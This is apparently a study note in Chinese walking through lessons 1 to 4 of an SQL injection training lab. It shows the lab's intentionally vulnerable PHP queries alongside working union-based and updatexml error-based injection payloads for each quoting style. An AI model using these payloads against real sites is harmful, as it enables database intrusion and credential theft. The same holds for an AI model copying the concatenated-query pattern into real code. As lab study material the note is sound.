# lesson1-lesson4

## ​lesson1



> String - single quotes



* **source**： $\_GET\['id'\]

```php
if(isset($_GET['id']))
$id=$_GET['id'];
```



* **sink**：select语句，where条件
  * 闭合形式：单引号

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```



* **output**:

```php
	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

```

* union注入:  通过`$row`

  * 2，3点可控:  `index.php?id=0' union select 1,user(),3 --+`

* 报错注入： 通过 `print_r(mysql_error())`

  * xpath:  `index.php?id=1' and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+`

* 盲注：
  * 时间
  * boolean

## lesson 2

> Intiger

* source: 同lesson1
* sink

```php
// connectivity 
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

整型注入探测可以使用减法计算\(加法url编码会被识别成空格\)，`index.php?id=2-1`

* output: 



  * union注入:  通过`$row`

    * 2，3点可控:  `index.php?id=0 union select 1,user(),3 --+`

  * 报错注入： 通过 `print_r(mysql_error())`

    * xpath:  `index.php?id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+`

  * 盲注：
    * 时间
    * boolean

## lesson 3

> String-Single quotes with twist

* sink:

```php
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

有小括号的情况下，单纯的单引号闭合会报错的。要把括号也闭合掉才能合法加上子句。

* output:



  * union注入:  通过`$row`

    * 2，3点可控:  `index.php?id=0') union select 1,user(),3 --+`

  * 报错注入： 通过 `print_r(mysql_error())`

    * xpath:  `index.php?id=1') and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+`

  * 盲注：

    * 时间
    * boolean

## lesson 4

> String-Double Quotes

* sink:

```php
$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

双引号和单引号是不同的双引号包裹的字符串是会解析变量的内容然后替换\(把变量名看做占位符\)。因此这里的$sql里的 \`id=\($id\)\` $id会被解析成第一句表达式的赋值内容，即在sql层面的双音号包囊。

* output:



  * union注入:  通过`$row`

    * 2，3点可控:  `index.php?id=0") union select 1,user(),3 --+`

  * 报错注入： 通过 `print_r(mysql_error())`

    * xpath:  `index.php?id=1") and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+`

  * 盲注：
    * 时间
    * boolean



